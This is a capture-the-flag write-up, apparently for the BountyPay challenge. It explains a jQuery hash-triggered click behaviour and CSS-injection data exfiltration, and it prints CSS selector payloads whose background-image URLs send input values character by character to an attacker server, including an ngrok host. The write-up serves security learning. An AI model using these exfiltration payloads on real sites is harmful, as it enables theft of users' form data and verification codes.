## Exploiting Report to Admin functionality
- Again going through the WebApp, I found out it is using older version of jQuery which has some public XSS CVEs. After trying for some time, I couldn't find anything related to this and decided to move on.

- I revisited the javascript and found this code at the bottom:

```javascript
document.location.hash.length > 0 && 
("#tab1" === document.location.hash && $(".tab1").trigger("click"),
 "#tab2" === document.location.hash && $(".tab2").trigger("click"), 
 "#tab3" === document.location.hash && $(".tab3").trigger("click"),
  "#tab4" === document.location.hash && $(".tab4").trigger("click"));
```

So as there were tabs in the application, this looks like something a developer might have written so that a particular tab can be opened when the page loads. For example, in the HTML we have:

```html
<li role="presentation" class="tab tab1 active" data-target="home"><a href="#">Home</a></li>
<li role="presentation" class="tab tab2" data-target="tickets"><a href="#">Support Tickets</a></li>
<li role="presentation" class="tab tab3" data-target="profile"><a href="#">Profile</a></li>
```

So opening https://staff.bountypay.h1ctf.com/?template=home#tab1 will open up Home, opening https://staff.bountypay.h1ctf.com/?template=home#tab2 will open up Support Tickets and so on. One might ask, how? 

So, let's take an example of `#tab1` being at the end of the URL. In JS this is populated in the `document.location.hash` variable. So, in this case `"#tab1" === document.location.hash` condition will be true which will execute `$(".tab1").trigger("click")`. This click triggers `$(".tab").click` function which shows the corresponding `content-id` div(In this case `home`)

```html
<div class="content content-home">
        <div class="alert alert-success text-center">
              <p>Our easy to use staff portal allows you to receive messages from our friendly admin team</p>
        </div>
</div>
```

Also, one trait of jQuery is that if $("selector") matches multiple elements and if we call $("selector").click() it will call click for all those elements and not just one element. This can be verified by the following HTML:

```html
<html>
<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
<button class="abc xyz" onclick="console.log('xyz')">xyz</button>
<button class="abc def" onclick="console.log('def')">def</button>
```

## What is Data Exfiltration using CSS?
- So CSS can't execute arbitrary javascript code in the client side, but doesn't mean that it isn't less dangerous. For starters, if we are able to include our custom CSS, we can leak the URL of the page by using the referer of the page. Also, we can use CSS selectors in such a way that we can extract information about some object character by character.

For example,

We can use the following CSS to check if there exists a input tag with name starting with 'a':

```css
input[name^="a"]{
    background-image: url("https://ourserver/?val=a");
}
```

But checking one by one would be tiresome, so we include a series of such selectors to detect the first character. When the first character is detected, we can move onto another character like this:

```css
input[name^="a"]{
    background-image: url("https://ourserver/?val=a");
}
input[name^="b"]{
    background-image: url("https://ourserver/?val=b");
}
...
input[name^="9"]{
    background-image: url("https://ourserver/?val=9");
}
```

So for solving this, I first tried with the known input names: `challenge_answer`, `challenge`, `challenge_timeout`. Turns out, none of them seemed to exist in the vulnerable page. I verified the existence by the following payload

```css
input[name="challenge_answer"]{
    background-image: url("https://ourserver/challenge_answer_exists");
}
```

I did the same with the other three but didn't receive any callbacks for them.

About the script:
- Creates a blank array with 7 elements
- `/start` endpoint/function submits the post request to `https://app.bountypay.h1ctf.com/pay/17538771/27cd1393c170e1e97f9507a5351ea1ba` with our ngrok URL (https://ngrok.url/css). This triggers the css url

- `/css` endpoint: This endpoint is called by the vulnerable page. This endpoint returns our auto-generated CSS using the function `getFullCss` and with mime-type `text/css`

It is of the form:

```css
    input[name="code_1"][value^="a"]{
        background-image: url("https://15d95cd78dd6.ngrok.io/exfil?name=code_1&val=a");
    }
    
...

    input[name="code_7"][value^="_"]{
        background-image: url("https://15d95cd78dd6.ngrok.io/exfil?name=code_7&val=_");
    }
```

It covers all `code_1`-`code_7` 

- `/exfil` endpoint receives callbacks from the CSS. With each callback, it sets the particular value in the array. So for `?name=code_4&val=a`, array's 3rd element would be set to `a`. In this way, when the array is full, we send it along with the challenge_timeout and challenge we received.
